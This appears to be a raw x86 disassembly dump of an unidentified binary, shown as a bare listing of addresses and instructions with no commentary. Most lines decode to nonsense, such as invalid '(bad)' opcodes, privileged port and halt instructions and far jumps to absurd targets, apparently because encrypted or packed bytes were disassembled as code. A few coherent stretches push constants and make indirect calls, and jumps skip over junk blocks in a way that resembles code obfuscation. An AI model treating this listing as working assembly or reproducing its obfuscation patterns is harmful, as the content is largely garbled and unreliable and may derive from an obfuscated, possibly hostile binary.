  426515:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426516:	test   al,0x48
  426518:	adc    BYTE PTR [ecx],al
  42651a:	data16 add al,0x85
  42651d:	mov    al,ds:0x5707086b
  426522:	mov    dh,0xfd
  426524:	outs   dx,BYTE PTR ds:[esi]
  426525:	jmp    0x81e1:0x675840dc
  42652c:	(bad)  
  42652d:	cmc    
  42652e:	les    esp,FWORD PTR [ebp+0x58]
  426531:	add    edi,ecx
  426533:	inc    esi
  426534:	popf   
  426535:	out    0xcd,al
  426537:	js     0x4265a7
  426539:	rcl    DWORD PTR [edi-0x7f],cl
  42653c:	scas   al,BYTE PTR es:[edi]
  42653d:	jp     0x4264e5
  42653f:	jg     0x426542
  426541:	jle    0x4264e7
  426543:	push   esi
  426544:	xor    esp,DWORD PTR [ecx-0x172e9e45]
  42654a:	mov    ebx,0xd96e1eea
  42654f:	xlat   BYTE PTR ds:[ebx]
  426550:	jecxz  0x426564
  426552:	sub    ebp,esp
  426554:	call   FWORD PTR [esi-0x18f13ba3]
  42655a:	cmp    dl,0xf2
  42655d:	iret   
  42655e:	loop   0x426523
  426560:	or     BYTE PTR [eax],ch
  426562:	pushf  
  426563:	push   ebp
  426564:	add    al,BYTE PTR [esi+eax*8]
  426567:	add    eax,0x2459287d
  42656c:	xor    BYTE PTR [edx+0x64062ab],0x96
  426573:	and    BYTE PTR [edx+0x3b],0xf2
  426577:	xor    cl,BYTE PTR [ecx]
  426579:	mov    eax,ds:0x3ae7688
  42657e:	stos   DWORD PTR es:[edi],eax
  42657f:	cmp    DWORD PTR [ebx-0x7d],esi
  426582:	test   al,0xc7
  426584:	inc    ebx
  426585:	mov    dl,0xbe
  426587:	dec    ebp
  426588:	mov    eax,ds:0x4331b4
  42658d:	mov    esi,DWORD PTR ds:0x432028
  426593:	mov    edi,DWORD PTR ds:0x43202c
  426599:	sub    esi,edi
  42659b:	sub    esi,DWORD PTR [esi+edi*1]
  42659e:	jmp    0x42667e
  4265a3:	add    DWORD PTR [ecx+0x1c],ebx
  4265a6:	ss pop esp
  4265a8:	ja     0x4265d5
  4265aa:	jg     0x4265fa
  4265ac:	adc    ebx,DWORD PTR [edx+0x5f]
  4265af:	into   
  4265b0:	bound  esp,QWORD PTR [eax+0xd]
  4265b3:	pop    ebp
  4265b5:	add    DWORD PTR [eax],eax
  4265b7:	ret    
  4265b8:	add    BYTE PTR [eax],al
  4265ba:	add    BYTE PTR [esi],ah
  4265bc:	mov    eax,ds:0x11b776bc
  4265c1:	out    0x56,eax
  4265c3:	je     0x42654b
  4265c5:	or     dl,BYTE PTR [edx*2+0x70bd77d6]
  4265cc:	xchg   edi,eax
  4265cd:	cmc    
  4265ce:	xor    BYTE PTR [edx+0x52037980],dl
  4265d4:	pushf  
  4265d5:	mov    dl,0xc8
  4265d7:	dec    edi
  4265d8:	fidiv  WORD PTR [edi-0x3d1b25fa]
  4265de:	es cdq 
  4265e0:	(bad)  
  4265e1:	fnstcw WORD PTR [eax+0x21ac4839]
  4265e7:	cdq    
  4265e8:	xchg   ecx,eax
  4265e9:	scas   al,BYTE PTR es:[edi]
  4265ea:	(bad)  
  4265eb:	stc    
  4265ec:	stos   DWORD PTR es:[edi],eax
  4265ed:	inc    esi
  4265ee:	sbb    ah,BYTE PTR [ebp-0x5f]
  4265f1:	xchg   esi,eax
  4265f2:	xchg   BYTE PTR [edi-0x5244c2c6],bh
  4265f8:	adc    al,BYTE PTR [esi+0x4e0402de]
  4265fe:	lea    esp,cs:[ebp+0x6b]
  426602:	shl    DWORD PTR [ebx+ebp*4+0x39],0x17
  426607:	and    esi,0xfffffff6
  42660a:	sbb    edi,ebp
  42660c:	fwait
  42660d:	push   ds
  42660e:	mov    dl,0x20
  426610:	jl     0x42664c
  426612:	xor    edx,DWORD PTR [ebp-0x38]
  426615:	rcl    DWORD PTR [eax-0x37aa93fe],cl
  42661b:	and    DWORD PTR [ebp-0x3760afe3],ebx
  426621:	dec    ebp
  426622:	sub    al,0x2f
  426624:	test   eax,0x7ee2cbb7
  426629:	daa    
  42662a:	adc    eax,0xcfeb65f2
  42662f:	sub    ah,BYTE PTR [ebp+0x8]
  426632:	outs   dx,BYTE PTR ds:[esi]
  426633:	mov    ebp,0x17179b4c
  426638:	repnz sti 
  42663a:	call   0x130f3c3f
  42663f:	inc    ecx
  426640:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426641:	mov    ds:0xb0c8ef80,eax
  426646:	cmp    al,0xb
  426648:	call   0x4bd4:0xd8c9b8ca
  42664f:	or     ebp,edi
  426651:	mov    ds:0x24a8789f,al
  426656:	mov    edi,0x76080124
  42665b:	cmp    eax,0x334f59af
  426660:	jne    0x426610
  426662:	sahf   
  426663:	mov    ah,0xce
  426665:	jbe    0x42664a
  426667:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426668:	shl    BYTE PTR [edi],0x8a
  42666b:	(bad)  
  42666c:	fadd   st,st(6)
  42666e:	and    eax,0xc4550450
  426673:	push   eax
  426674:	(bad)  
  426675:	pop    ebp
  426676:	xlat   BYTE PTR ds:[ebx]
  426677:	mov    bl,0x1d
  426679:	ret    
  42667a:	jmp    0xc880:0x8bee1223
  426681:	add    DWORD PTR [eax],eax
  426683:	add    BYTE PTR [ebx-0x10777300],cl
  426689:	mov    al,BYTE PTR [edi]
  42668b:	ret    
  42668c:	cmp    DWORD PTR ds:0x4335d4,0x0
  426693:	ja     0x4266ca
  426699:	xor    edi,esi
  42669b:	jmp    0x4266ca
  4266a0:	push   0x20da
  4266a5:	push   0x433644
  4266aa:	push   DWORD PTR [ebp-0x20]
  4266ad:	push   0x4335bc
  4266b2:	push   0x196f
  4266b7:	push   0x1d7e
  4266bc:	push   DWORD PTR [ebp-0x28]
  4266bf:	push   0x26d6
  4266c4:	call   DWORD PTR ds:0x43c80c
  4266ca:	add    eax,0xffff8aef
  4266cf:	shl    eax,0x10
  4266d2:	xor    ecx,0x78e20000
  4266d8:	jmp    0x4267b8
  4266dd:	cmp    BYTE PTR [ebx+0x23],bh
  4266e0:	mov    fs,WORD PTR [ebx-0x22]
  4266e3:	mov    ebp,0x1e355eff
  4266e8:	sub    BYTE PTR [bx+0x6],al
  4266ec:	ficom  WORD PTR [edx-0x3a]
  4266ef:	add    DWORD PTR [eax],eax
  4266f1:	ret    
  4266f2:	add    BYTE PTR [eax],al
  4266f4:	add    BYTE PTR [ecx-0x23dc42d9],bh
  4266fa:	push   ebx
  4266fb:	into   
  4266fc:	int    0x40
  4266fe:	in     eax,dx
  4266ff:	mov    ebp,esi
  426701:	fnsave [edi]
  426703:	push   esi
  426704:	in     eax,dx
  426705:	rcl    BYTE PTR [eax-0x1bfbd54e],1
  42670b:	test   eax,0x6c5bff45
  426710:	and    DWORD PTR [esi],ecx
  426712:	cmp    DWORD PTR [eax],0xe5a91403
  426718:	repz out 0xc,al
  42671b:	and    ecx,DWORD PTR [eax]
  42671d:	in     eax,0xd3
  42671f:	sar    DWORD PTR [esi+0x29],0xa7
  426723:	mov    eax,0xd4895474
  426728:	fdivr  QWORD PTR [ecx+0x49f389c6]
  42672e:	(bad)  
  42672f:	fbld   TBYTE PTR [esi+0xa]
  426732:	mov    edx,edi
  426734:	cmp    BYTE PTR [esi+0x23777aa],bl
  42673a:	push   ds
  42673b:	mov    ebp,0x58297e6e
  426740:	sub    BYTE PTR [esi+0x3e],bh
  426743:	inc    ecx
  426744:	hlt    
  426745:	xchg   ebx,eax
  426746:	test   eax,0xb2ec5531
  42674b:	fs repz jecxz 0x4266da
  42674f:	add    DWORD PTR [eax],esp
  426751:	pop    ecx
  426752:	lock cs push edi
  426755:	popa   
  426756:	imul   ecx,DWORD PTR [ebx],0x5cccecd0
  42675c:	hlt    
  42675d:	xchg   ebp,eax
  42675e:	dec    eax
  42675f:	jne    0x4267ab
  426761:	and    bh,BYTE PTR [ebp-0xe801c85]
  426767:	push   ecx
  426768:	jle    0x4266fb
  42676a:	push   es
  42676b:	jno    0x4267a7
  42676d:	inc    eax
  42676e:	bound  esi,QWORD PTR [eax+0x3b9f9487]
  426774:	inc    edx
  426775:	into   
  426776:	inc    eax
  426777:	outs   dx,DWORD PTR ds:[esi]
  426778:	mov    bh,0x74
  42677a:	mov    ebp,0xfba6af9b
  42677f:	jecxz  0x42671b
  426781:	dec    ebp
  426782:	xor    BYTE PTR ds:0x6a363172,ch
  426788:	and    bh,al
  42678a:	jg     0x4267ba
  42678c:	xchg   esi,eax
  42678d:	and    eax,0x92ce7158
  426792:	inc    ebp
  426793:	sbb    al,0x47
  426795:	mov    esi,0x57e5041b
  42679a:	jl     0x4267e3
  42679c:	push   0x36a29fb6
  4267a1:	pop    esp
  4267a2:	jno    0x4267ce
  4267a4:	cdq    
  4267a5:	cmp    BYTE PTR [ebp+0x11ac4c5d],dh
  4267ab:	sbb    eax,0x129820ae
  4267b0:	out    dx,al
  4267b1:	shl    DWORD PTR [ebx-0x22],cl
  4267b4:	mov    eax,0x3524d914
  4267b9:	add    BYTE PTR [eax],al
  4267bb:	leave  
  4267bc:	pop    ecx
  4267bd:	jmp    0x42689d
  4267c2:	inc    esp
  4267c3:	mov    ah,0x24
  4267c5:	jns    0x4267bb
  4267c7:	stc    
  4267c8:	pop    ebp
  4267c9:	mov    ebp,0xa1871ba6
  4267ce:	sti    
  4267cf:	jl     0x426762
  4267d1:	dec    esi
  4267d2:	adc    eax,0xc30001c7
  4267d7:	add    BYTE PTR [eax],al
  4267d9:	add    BYTE PTR [esi],cl
  4267db:	fmul   QWORD PTR [edi+eax*2+0x491eff9f]
  4267e2:	sub    eax,0x2d6de938
  4267e7:	es and al,0xd8
  4267ea:	xlat   BYTE PTR ds:[ebx]
  4267eb:	into   
  4267ec:	jl     0x42684e
  4267ee:	push   ss
  4267ef:	mov    eax,0x8f284118
  4267f4:	in     al,dx
  4267f5:	mov    BYTE PTR [edi],bh
  4267f7:	jne    0x42686b
  4267f9:	call   0x5155:0x7d6a307c
  426800:	mov    cl,0x7f
  426802:	adc    eax,0x267ad283
  426807:	int3   
  426808:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426809:	fistp  QWORD PTR [edx]
  42680b:	jno    0x42682b
  42680d:	sub    BYTE PTR ds:0xa474d94,ch
  426813:	cmp    ch,BYTE PTR [edi-0x3b]
  426816:	mov    BYTE PTR [ebp-0x61],dh
  426819:	ja     0x426886
  42681b:	stos   BYTE PTR es:[edi],al
  42681c:	xor    eax,0x2055ef03
  426821:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426822:	pop    edi
  426823:	mov    bl,0xf2
  426825:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426826:	mov    bl,0xd0
  426828:	add    esi,DWORD PTR [ecx]
  42682a:	mov    eax,0xf41a0752
  42682f:	mov    dh,0xbb
  426831:	jo     0x426867
  426833:	mov    dl,0x9c
  426835:	dec    dh
  426837:	fiadd  DWORD PTR [edx-0x7edadfed]
  42683d:	add    al,0xc1
  42683f:	leave  
  426840:	out    0x2d,al
  426842:	cld    
  426843:	aas    
  426844:	sbb    BYTE PTR [ebp-0x612b59d9],ch
  42684a:	inc    ecx
  42684b:	adc    al,0x62
  42684d:	mov    ah,0xbf
  42684f:	out    dx,al
  426850:	push   edx
  426851:	cmp    dl,BYTE PTR [edx+0x1eef3190]
  426857:	retf   
  426858:	mov    ebx,0xf8d9fef3
  42685d:	loop   0x42687b
  42685f:	(bad)  
  426860:	sub    al,0xa3
  426862:	loop   0x426820
  426864:	jo     0x42688e
  426866:	cmc    
  426867:	push   ebp
  426868:	test   al,0xe6
  42686a:	les    eax,FWORD PTR [eax]
  42686c:	retf   0xfe4
  42686f:	jo     0x426825
  426871:	mov    ds:0x9e2e047d,al
  426876:	enter  0x1a6c,0xdc
  42687a:	loop   0x426881
  42687c:	shl    ecx,1
  42687e:	pop    es
  42687f:	push   ds
  426880:	pop    edi
  426881:	shr    DWORD PTR [edx-0x41],0xf5
  426885:	mov    cl,dl
  426887:	mov    al,ds:0xc05a42cc
  42688c:	ret    
  42688d:	fst    QWORD PTR [esi+edi*1]
  426890:	sub    BYTE PTR [edi],bl
  426892:	inc    ebx
  426893:	lea    ebx,[edi+0x5c]
  426896:	jnp    0x42689e
  426898:	icebp  
  426899:	das    
  42689a:	pop    edx
  42689b:	pop    eax
  42689c:	jb     0x42685f
  42689e:	jmp    0x840a73b3
  4268a3:	cmp    eax,0x433638
  4268a8:	add    BYTE PTR [edi],cl
  4268aa:	mov    WORD PTR [eax],?
  4268ac:	add    BYTE PTR [eax],al
  4268ae:	add    BYTE PTR [edi],cl
  4268b0:	mov    dh,0x5
  4268b2:	mov    eax,0x11004335
  4268b7:	add    eax,0x433584
  4268bc:	jmp    0x4268df
  4268c1:	push   DWORD PTR [ebp-0x18]
  4268c4:	push   0x433534
  4268c9:	push   0x42ecd8
  4268ce:	push   DWORD PTR [ebp-0x18]
  4268d1:	push   0x3ed3
  4268d6:	push   DWORD PTR [ebp-0x10]
  4268d9:	call   DWORD PTR ds:0x43c810
  4268df:	mov    eax,DWORD PTR [esp+0x28]
  4268e3:	jmp    0x4269c3
  4268e8:	fnstcw WORD PTR [edi-0x528156e6]
  4268ee:	sti    
  4268ef:	inc    eax
  4268f1:	and    eax,0xd486da74
  4268f6:	adc    ebx,esi
  4268f8:	fadd   st,st(7)
  4268fa:	add    DWORD PTR [eax],eax
  4268fc:	ret    
  4268fd:	add    BYTE PTR [eax],al
  4268ff:	add    BYTE PTR [esi+0x20d72c46],bh
  426905:	push   esi
  426906:	xchg   esp,eax
  426907:	imul   esp,esi,0x5
  42690a:	jle    0x426920
  42690c:	add    ebx,DWORD PTR [ecx-0x53558f1b]
  426912:	sub    BYTE PTR [eax],0xfe
  426915:	mov    ah,0x45
  426917:	fst    DWORD PTR [ebp+ebx*1-0x6a]
  42691b:	pop    eax
  42691c:	pop    ebx
  42691e:	sbb    ah,cl
  426920:	enter  0x6b08,0x2d
  426924:	shl    BYTE PTR [ecx+0x746f09e3],1
  42692a:	out    dx,eax
  42692b:	xchg   edi,eax
  42692c:	ins    DWORD PTR es:[edi],dx
  42692d:	fwait
  42692e:	xchg   edx,eax
  42692f:	lods   al,BYTE PTR ds:[esi]
  426930:	jbe    0x4268ee
  426932:	sub    BYTE PTR [esi+0x14],al
  426935:	mov    ebp,0xc250c699
  42693a:	mov    ebp,0xd7cc3e21
  42693f:	xor    al,0x2d
  426941:	mov    dl,0x39
  426943:	cmp    bh,BYTE PTR [ebx-0x42]
  426946:	pop    es
  426947:	push   cs
  426948:	sub    eax,0xa167c393
  42694d:	mov    eax,0x564e5dda
  426952:	xor    bh,bl
  426954:	jl     0x4269c1
  426956:	dec    esi
  426957:	sub    dh,0x72
  42695a:	repnz xor eax,0xd78396fa
  426960:	xchg   BYTE PTR [eax+0xd],dl
  426963:	jo     0x426980
  426965:	ja     0x4269e3
  426967:	lock jo 0x426982
  42696a:	push   0x2d
  42696c:	jmp    FWORD PTR [esp+esi*8]
  42696f:	pushf  
  426970:	push   es
  426971:	push   0x9335e576
  426976:	fisttp QWORD PTR [eax]
  426978:	test   eax,0xb8745cec
  42697d:	cs xchg edi,eax
  42697f:	ret    
  426980:	xchg   BYTE PTR [ebp-0x37fb9811],al
  426986:	sub    eax,esi
  426988:	mov    DWORD PTR [edi+0x2889617a],ebx
  42698e:	fwait
  42698f:	or     BYTE PTR [edi],bh
  426991:	push   esi
  426992:	popf   
  426993:	lock cmp al,0xf8
  426996:	inc    edi
  426997:	in     eax,dx
  426998:	adc    eax,0x2d673bf6
  42699d:	ins    BYTE PTR es:[edi],dx
  42699e:	std    
  42699f:	inc    esi
  4269a0:	mov    cl,0xec
  4269a2:	push   ebp
  4269a3:	fld    DWORD PTR [edx+0x27]
  4269a6:	cdq    
  4269a7:	adc    al,0x59
  4269a9:	cli    
  4269aa:	gs mov cl,0xe6
  4269ae:	xor    dl,BYTE PTR [ecx+0x160ac67]
  4269b4:	imul   ebp,DWORD PTR [eax-0x3221efd3],0xffffff8d
  4269bb:	sbb    ch,ch
  4269bd:	mov    gs,WORD PTR [edi-0x1440f9c6]
  4269c3:	sub    ecx,0x3cf87511
  4269c9:	jmp    0x426aa9
  4269ce:	cmc    
  4269cf:	ret    
  4269d0:	sub    BYTE PTR [esi+edi*1],cl
  4269d3:	out    dx,eax
  4269d4:	cmc    
  4269d5:	sti    
  4269d6:	xchg   esi,eax
  4269d7:	sar    BYTE PTR [edx+0x3e68a7c3],1
  4269dd:	dec    esi
  4269de:	fwait
  4269df:	enter  0x1,0xc3
  4269e3:	add    BYTE PTR [eax],al
  4269e5:	add    BYTE PTR [ecx-0x5d],dl
  4269e8:	ds call 0xb7e:0x9dafe65e
  4269f0:	dec    esi
  4269f1:	push   cs
  4269f2:	je     0x426a09
  4269f4:	cmp    eax,0xc2bacd11
  4269f9:	sbb    al,0x41
  4269fb:	leave  
  4269fc:	pusha  
  4269fd:	cmc    
  4269fe:	imul   edx,edx,0x11
  426a01:	cli    
  426a02:	add    esp,DWORD PTR [edx+0x2dba3fe0]
  426a08:	sbb    ebp,DWORD PTR [edx]
  426a0a:	push   0xa6306c6b
  426a0f:	iret   
  426a10:	ins    BYTE PTR es:[edi],dx
  426a11:	pop    eax
  426a12:	js     0x42699b
  426a14:	enter  0x706e,0xc
  426a18:	nop
  426a19:	inc    ebx
  426a1a:	jno    0x426a2f
  426a1c:	lock push edx
  426a1e:	pop    ecx
  426a1f:	pusha  
  426a20:	cli    
  426a21:	dec    ebx
  426a22:	sbb    DWORD PTR [esi-0x3c],edx
  426a25:	enter  0x5c79,0xed
  426a29:	sub    al,0xd1
  426a2b:	jo     0x4269c8
  426a2d:	mov    eax,ds:0x9c8136c7
  426a32:	jae    0x426a1d
  426a34:	stc    
  426a35:	or     ch,BYTE PTR [edi]
  426a37:	mov    edx,0x35ad93c3
  426a3c:	imul   esp,DWORD PTR [edx+edi*8],0x22b84f68
  426a43:	dec    ecx
  426a44:	out    0x12,eax
  426a46:	adc    esp,DWORD PTR [edx-0xc0823e8]
  426a4c:	xchg   edx,eax
  426a4d:	(bad)  
  426a4e:	in     al,0xff
  426a50:	jo     0x426a38
  426a52:	cwde   
  426a53:	jo     0x4269e2
  426a55:	push   edx
  426a56:	push   0x299727f3
  426a5b:	ret    0xff46
  426a5e:	jecxz  0x426a0f
  426a60:	clc    
  426a61:	dec    edi
  426a62:	mov    ch,0x4a
  426a64:	pushf  
  426a65:	into   
  426a66:	sbb    DWORD PTR [esi-0x36b873ef],ecx
  426a6c:	xor    DWORD PTR [esi],esi
  426a6e:	push   edi
  426a6f:	push   0x7aaf8812
  426a74:	inc    ebx
  426a75:	cdq    
  426a76:	scas   al,BYTE PTR es:[edi]
  426a77:	es pop ss
  426a79:	xlat   BYTE PTR ds:[ebx]
  426a7a:	ret    0x461a
  426a7d:	out    0x69,eax
  426a7f:	test   edx,edx
  426a81:	jnp    0x426a63
  426a83:	xlat   BYTE PTR ds:[ebx]
  426a84:	sub    eax,0xb4f39e92
  426a89:	popa   
  426a8a:	add    al,dl
  426a8c:	jecxz  0x426acb
  426a8e:	add    ch,al
  426a90:	in     eax,dx
  426a91:	cwde   
  426a92:	or     dh,BYTE PTR [edi+0x1d]
  426a95:	add    dh,BYTE PTR ds:0x9b81859
  426a9b:	pop    ebx
  426a9c:	nop
  426a9d:	(bad)  
  426a9f:	pop    ebp
  426aa0:	jo     0x426a45
  426aa2:	push   0xaca1d8d7
  426aa7:	rol    DWORD PTR [ecx+ecx*4+0x8],0xe9
  426aac:	fild   DWORD PTR [eax]
  426aae:	add    BYTE PTR [eax],al
  426ab0:	sbb    bl,ch
  426ab2:	jmp    0x7cda664c
  426ab7:	out    dx,eax
  426ab8:	dec    ebx
  426ab9:	or     edi,DWORD PTR [esi+0x5f]
  426abc:	(bad)  
  426abd:	lods   al,BYTE PTR ds:[esi]
  426abe:	out    0x60,al
  426ac0:	pop    esi
  426ac1:	leave  
  426ac2:	add    DWORD PTR [eax],eax
  426ac4:	ret    
  426ac5:	add    BYTE PTR [eax],al
  426ac7:	add    ah,al
  426ac9:	in     eax,dx
  426aca:	in     al,dx
  426acb:	and    BYTE PTR [eax+0x4eaaf9ed],al
  426ad1:	shr    DWORD PTR [edi-0x1c9cb5e5],1
  426ad7:	aam    0xe7
  426ad9:	cmc    
  426ada:	lahf   
  426adb:	pusha  
  426adc:	inc    edi
  426add:	loope  0x426ab0
  426adf:	mov    WORD PTR [ebp-0x28],gs
  426ae2:	add    bh,BYTE PTR [edx+0x547b1c82]
  426ae8:	xchg   ecx,eax
  426ae9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426aea:	push   ss
  426aeb:	inc    edx
  426aec:	jp     0x426aba
  426aee:	mov    cl,BYTE PTR [esi]
  426af0:	lods   al,BYTE PTR ds:[esi]
  426af1:	add    al,0x42
  426af3:	mov    edi,0x2550246a
  426af8:	push   0x4c
  426afa:	ret    
  426afb:	sbb    DWORD PTR [ebp+0x46],0xdad9b0a5
  426b02:	(bad)  [ebx+esi*1]
  426b05:	lahf   
  426b06:	mov    ecx,0x61066e13
  426b0b:	dec    esi
  426b0c:	cld    
  426b0d:	mov    edi,0xaf7627e6
  426b12:	push   ebp
  426b13:	outs   dx,BYTE PTR es:[esi]
  426b15:	jo     0x426ade
  426b17:	mov    al,ds:0x6ddd65df
  426b1c:	xlat   BYTE PTR ds:[ebx]
  426b1d:	push   ss
  426b1e:	pop    ebp
  426b1f:	cmp    eax,0x16b3e6e2
  426b24:	nop
  426b25:	mov    edi,0x40cc7cbe
  426b2a:	cmp    DWORD PTR [ecx+0x1c77515e],esp
  426b30:	sbb    al,0x9a
  426b32:	sbb    edi,0xffffffe6
  426b35:	add    al,0x90
  426b37:	add    al,0x32
  426b39:	mov    edi,0x29650750
  426b3e:	and    BYTE PTR [edx],dh
  426b40:	call   DWORD PTR [ebp-0x5c]
  426b43:	push   esp
  426b44:	out    0x13,al
  426b46:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426b47:	cmc    
  426b48:	push   0x73739fa2
  426b4d:	adc    BYTE PTR ds:0x8a31b1da,bl
  426b53:	pop    DWORD PTR [eax+ecx*2+0x42]
  426b57:	les    ebx,FWORD PTR [eax+0x71]
  426b5a:	clc    
  426b5b:	and    ah,BYTE PTR [edx-0x15c98ed]
  426b61:	pop    ds
  426b62:	push   ss
  426b63:	mov    eax,0xcde5e04b
  426b68:	adc    al,0x45
  426b6a:	inc    ecx
  426b6b:	leave  
  426b6c:	mov    ch,0xbf
  426b6e:	jle    0x426bb9
  426b70:	retf   0x2835
  426b73:	sbb    dh,ah
  426b75:	mov    edx,0xec56fa14
  426b7a:	or     eax,0x3ca833d6
  426b7f:	(bad)  
  426b80:	mov    ds:0xa3d2017a,al
  426b85:	in     eax,0xcb
  426b87:	pusha  
  426b88:	jo     0x426bc5
  426b8a:	stos   BYTE PTR es:[edi],al
  426b8b:	mov    DWORD PTR [esp+0x30],0x3df4
  426b93:	mov    DWORD PTR [esp+0x28],0x118
  426b9b:	xor    ecx,ecx
  426b9d:	xor    ecx,DWORD PTR ds:0x433698
  426ba3:	mov    eax,ds:0x43001c
  426ba8:	sub    ecx,eax
  426baa:	sub    ecx,DWORD PTR [ecx+eax*1]
  426bad:	mov    eax,DWORD PTR [esp+0x28]
  426bb1:	cmp    DWORD PTR ds:0x433538,0x0
  426bb8:	jg     0x426bce
  426bbe:	sbb    ecx,esi
  426bc0:	jmp    0x426bce
  426bc5:	push   DWORD PTR [ebp-0xc]
  426bc8:	call   DWORD PTR ds:0x43c814
  426bce:	mov    ecx,DWORD PTR [esp+0x30]
  426bd2:	xor    eax,0xb73
  426bd7:	sub    eax,ecx
  426bd9:	mov    DWORD PTR [esp+0x18],eax
  426bdd:	mov    DWORD PTR [esp+0x40],0x9
  426be5:	mov    DWORD PTR [esp+0x3c],0x6952
  426bed:	xor    edi,0x291c
  426bf3:	mov    DWORD PTR [esp+0x30],0x7b24
  426bfb:	add    DWORD PTR ds:0x433654,0x4400
  426c05:	jmp    0x426ce5
  426c0a:	adc    BYTE PTR [edi],bh
  426c0c:	pop    ebp
  426c0d:	mov    dl,0x7f
  426c0f:	repnz (bad) 
  426c11:	mov    edi,0xc36910be
  426c16:	add    eax,0x214ef144
  426c1b:	retf   0x1
  426c1e:	ret    
  426c1f:	add    BYTE PTR [eax],al
  426c21:	add    BYTE PTR [esi-0x401d4b33],ch
  426c27:	add    dh,BYTE PTR [edx+0x4c]
  426c2a:	sub    al,0x51
  426c2c:	mov    dl,0x41
  426c2e:	pusha  
  426c2f:	call   ebx
  426c31:	in     al,dx
  426c32:	dec    DWORD PTR [esi]
  426c34:	add    dh,BYTE PTR [ecx]
  426c36:	or     al,0xb7
  426c38:	jne    0x426bdb
  426c3a:	mov    ebx,DWORD PTR [ebp+0x6344ae3b]
  426c40:	pushf  
  426c41:	cmp    bh,BYTE PTR [esi-0x38]
  426c44:	jns    0x426c84
  426c46:	push   ecx
  426c47:	icebp  
  426c48:	xchg   BYTE PTR [ecx-0x77],bl
  426c4b:	ins    BYTE PTR es:[edi],dx
  426c4c:	stc    
  426c4d:	ret    0xa425
  426c50:	jo     0x426be3
  426c52:	add    eax,0x6e246564
  426c57:	jp     0x426c28
  426c59:	es ds sbb ebp,ecx
  426c5d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426c5e:	adc    BYTE PTR [edi],cl
  426c60:	push   ebp
  426c61:	jge    0x426c20
  426c63:	mov    WORD PTR [eax+0x6bb99a92],ds
  426c69:	js     0x426c8c
  426c6b:	ror    DWORD PTR [ebx+0x4],0x99
  426c6f:	push   ebx
  426c70:	cmp    al,0x65
  426c72:	adc    al,BYTE PTR [ebx+0x1f]
  426c75:	clc    
  426c76:	mov    ebx,edx
  426c78:	cmp    DWORD PTR [ebx+ebx*2],ebp
  426c7b:	jns    0x426c2f
  426c7d:	stos   DWORD PTR es:[edi],eax
  426c7e:	xor    bl,BYTE PTR [ebx+0x4a84c63b]
  426c84:	jl     0x426c5b
  426c86:	(bad)  
  426c87:	jns    0x426ce7
  426c89:	cmp    BYTE PTR [edx+esi*2+0x1],cl
  426c8d:	mov    bl,0xd8
  426c8f:	fdiv   DWORD PTR [ebx]
  426c91:	jmp    0x426ce1
  426c93:	shl    BYTE PTR [ebp+0x5c],0xdc
  426c97:	xor    eax,0x2e6f4194
  426c9c:	cmp    BYTE PTR [edi+0x5d],ah
  426c9f:	imul   ebp,DWORD PTR [ebp-0x28e95015],0xffffff9b
  426ca6:	push   0x12
  426ca8:	ret    
  426ca9:	aad    0xef
  426cab:	and    eax,0x85fb284d
  426cb0:	shl    BYTE PTR [edx+ebx*1+0x63],1
  426cb4:	mov    ds:0xaef11757,eax
  426cb9:	cmp    al,BYTE PTR [eax]
  426cbb:	sub    eax,esi
  426cbd:	xlat   BYTE PTR ds:[ebx]
  426cbe:	cdq    
  426cbf:	outs   dx,DWORD PTR ds:[esi]
  426cc0:	fadd   st,st(2)
  426cc2:	or     al,0x7e
  426cc4:	sub    edx,esp
  426cc6:	mov    esp,DWORD PTR [edx-0x15738fa7]
  426ccc:	fiadd  DWORD PTR [esp+edi*4-0x5d9f60b0]
  426cd3:	out    0xcf,eax
  426cd5:	fldenv [ecx+0x6a420b62]
  426cdb:	pusha  
  426cdc:	stos   DWORD PTR es:[edi],eax
  426cdd:	xor    DWORD PTR [esi+0x17],esp
  426ce0:	jl     0x426c70
  426ce2:	mov    ecx,DWORD PTR [eax]
  426ce4:	jbe    0x426cad
  426ce6:	inc    esp
  426ce7:	and    al,0x28
  426ce9:	push   edi
  426cea:	jbe    0x426cec
  426cec:	add    BYTE PTR [ecx+0x43358c05],al
  426cf2:	add    BYTE PTR [eax-0x74ffffcb],cl
  426cf8:	inc    esp
  426cf9:	and    al,0x28
  426cfb:	and    DWORD PTR ds:0x43365c,0x23a1
  426d05:	mov    ecx,DWORD PTR [esp+0x30]
  426d09:	cmp    DWORD PTR ds:0x433544,0x0
  426d10:	ja     0x426e06
  426d16:	jmp    0x426e06
  426d1b:	push   0x5b1f
  426d20:	call   DWORD PTR ds:0x43c7e8
  426d26:	jmp    0x426e06
  426d2b:	dec    eax
  426d2c:	cmp    cl,bl
  426d2e:	int3   
  426d2f:	stc    
  426d30:	in     eax,dx
  426d31:	pop    ebp
  426d32:	mov    esp,0xd1cadc9
  426d37:	xor    bh,dh
  426d39:	pshufw mm4,mm4,0xca
  426d3d:	add    DWORD PTR [eax],eax
  426d3f:	ret    
  426d40:	add    BYTE PTR [eax],al
  426d42:	add    ch,bl
  426d44:	jmp    FWORD PTR [eax+eiz*2-0x72]
  426d48:	ret    
  426d49:	repnz adc ebx,DWORD PTR [edi]
  426d4c:	dec    ecx
  426d4d:	or     eax,DWORD PTR gs:[eax+0x6f]
  426d51:	jbe    0x426d21
  426d53:	out    0x4e,al
  426d55:	pop    edx
  426d56:	sbb    ebx,DWORD PTR [esi-0x39]
  426d59:	sub    BYTE PTR [edi+0x19],dh
  426d5c:	rol    BYTE PTR [esi-0x5e1002b9],0x4a
  426d63:	loop   0x426d99
  426d65:	dec    esi
  426d66:	(bad)  gs:[edi-0x2b]
  426d6a:	test   BYTE PTR [esi],0xec
  426d6d:	or     BYTE PTR [ebx+0x7d32d23d],cl
  426d73:	xor    DWORD PTR [ecx+0x7cf5ec98],esp
  426d79:	cmps   DWORD PTR cs:[esi],DWORD PTR es:[edi]
  426d7b:	call   eax
  426d7d:	sbb    bl,BYTE PTR [ebp+0x646e3f32]
  426d83:	mov    gs,WORD PTR [ebx+0x17f10290]
  426d89:	xor    eax,0x3e6e798f
